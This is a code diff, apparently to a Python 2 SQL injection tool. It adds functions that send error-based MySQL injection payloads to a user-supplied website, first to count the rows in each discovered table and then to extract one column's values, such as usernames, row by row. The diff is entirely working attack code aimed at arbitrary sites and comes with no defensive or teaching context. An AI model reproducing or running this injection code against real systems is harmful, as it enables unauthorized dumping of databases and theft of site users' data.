@@ -16,7 +16,8 @@ column_names = ['uname', 'username', 'usrname', 'usernames', 'admin', 'admins', 
 exploit_dict = {}
 exploit_tables = {}
 exploit_columnNames = {}
-
+exploit_recordsCount = {}
+exploit_recordsName = {}
 '''
 validate_vulnerable(url) takes the absolute path of url as input and validates
 if the url is vulnerable. It also differentiates between success and failure 
@@ -214,6 +215,47 @@ def getcolumnnames(url):
 			tempArr.append(exploitVal.decode('hex'))
 			exploit_columnNames[tempTableNamesHex[i].decode('hex')] = tempArr
 
+def getrecordscount(url):
+	tempDBName = exploit_dict.get('dbName')
+	tempTableNamesHex = exploit_dict.get('tableNameAscii')
+	tempTableNames = exploit_dict.get('tableNames')
+	tablesLen = len(tempTableNames)
+
+	for i in range(0,len(tempTableNames)):
+		tempObj = {}
+		exploitQuery  = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) " \
+						"FROM `"+ tempDBName +"`."+tempTableNames[i]+")) from information_schema.tables limit 0,1)," \
+						"floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+		res = requests.get(url + exploitQuery).text
+		exploitVal = splitascii(res)
+		# print exploitVal
+		tempObj["recCount"] = int(exploitVal)
+		exploit_recordsCount[tempTableNames[i]] = tempObj
+
+def getrecordnames(url):
+	tempDBName = exploit_dict.get('dbName')
+	tempTableNamesHex = exploit_dict.get('tableNameAscii')
+	tempTableNames = exploit_dict.get('tableNames')
+	tablesLen = len(tempTableNames)
+
+	for i in range(0,len(tempTableNames)):
+		tempObj = {}
+		tempArr = []
+		tempRecordCount = exploit_recordsCount[tempTableNames[i]].get('recCount')
+		tempColumnName = exploit_columnNames[tempTableNames[i]][1]
+		for j in range(0, tempRecordCount):
+			exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
+						   "Hex(cast("+tempTableNames[i]+"."+tempColumnName+" as char)),0x27,0x7e) FROM `"+ tempDBName +"`."+tempTableNames[i]+" LIMIT "+str(j)+",1))" \
+						   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
+
+			res = requests.get(url+exploitQuery).text
+			# print res
+			exploitVal = splitascii(res)
+			# print exploitVal
+			tempArr.append(exploitVal.decode('hex'))
+		tempObj[tempColumnName] = tempArr
+		exploit_recordsName[tempTableNames[i]] = tempObj
+
 if __name__ == "__main__":
 	web_url = raw_input("Enter website with absolute url:\n")
 	status_code = validate_vulnerable(web_url)
@@ -229,9 +271,13 @@ if __name__ == "__main__":
 		gettablenames(web_url)
 		getcolumncount(web_url)
 		getcolumnnames(web_url)
+		getrecordscount(web_url)
+		getrecordnames(web_url)
 		# print exploit_dict
-		print exploit_tables
+		# print exploit_tables
 		print exploit_columnNames
+		print exploit_recordsCount
+		print exploit_recordsName
 		'''
 		print "Tables"
 		print tables
